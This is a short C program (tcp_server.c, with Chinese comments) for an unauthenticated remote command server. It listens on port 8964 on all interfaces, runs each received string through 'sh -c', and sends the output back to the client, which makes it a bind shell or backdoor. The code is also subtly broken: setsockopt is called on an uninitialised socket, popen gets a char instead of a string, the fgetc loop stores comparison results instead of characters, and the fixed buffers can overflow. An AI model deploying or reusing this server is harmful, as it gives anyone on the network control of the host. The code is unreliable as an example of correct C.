// tcp_server.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <linux/in.h>
#include <signal.h>
#include <sys/wait.h>

#define PORT 8964
#define BACKLOG 5
#define BUF_SIZE 2048

int execute(char *command, char *buf)
{
	char commandbuf[2056];
	if ((NULL == command) || (NULL == buf)) {
		perror("command or buf is empty\n");
		return -1;
	}
	int count;
	count = 0;
	memset(commandbuf, 0, 2056);
	strcpy(commandbuf, "sh -c ");
	strcat(commandbuf, command);

	FILE *fp=popen(commandbuf, 'r');
//while(buf[count++]=fgetc(fp) != '\0' && count <2047);
	while ((buf[count++] = fgetc(fp) != EOF) && (count < 2047));

	buf[count] = '\0';
	pclose(fp);
	return count;
}

int main(int argc, char const *argv[])
{
	int mysocket, consocket, opt;
	struct sockaddr_in server_addr, client;
	int err;

	char cmd[BUF_SIZE];
	char send_buf[BUF_SIZE];
	char recv_buf[BUF_SIZE];

	// 端口重用
	opt = SO_REUSEADDR;
	setsockopt(mysocket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

	// 建立一个流式套接字
	mysocket = socket(AF_INET, SOCK_STREAM, 0);
	if (mysocket < 0) {
		printf("socket error\n");
		return -1;
	}
	// 设置服务器地址
	bzero(&server_addr, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	server_addr.sin_port = htons(PORT);

	// 绑定地址结构到套接字描述符
	err =
	    bind(mysocket, (struct sockaddr *) &server_addr,
		 sizeof(server_addr));
	if (err < 0) {
		printf("bind error\n");
		return -1;
	}
	// 设置侦听
	err = listen(mysocket, BACKLOG);
	if (err < 0) {
		printf("listen error\n");
		return -1;
	} else {
		printf("This server is listening on port: %d.\n", PORT);
	}

	// 主循环过程
	for (;;) {
		int len = sizeof(client);

		consocket =
		    accept(mysocket, (struct sockaddr *) &client, &len);

		if (consocket < 0) {
			continue;
		}

		recv(consocket, recv_buf, sizeof(recv_buf), 0);

		memset(cmd, 0, sizeof(cmd));
		strcat(cmd, recv_buf);

		execute(cmd, send_buf);
		send(consocket, send_buf, sizeof(send_buf), 0);
	}
	close(consocket);
	return 0;
}
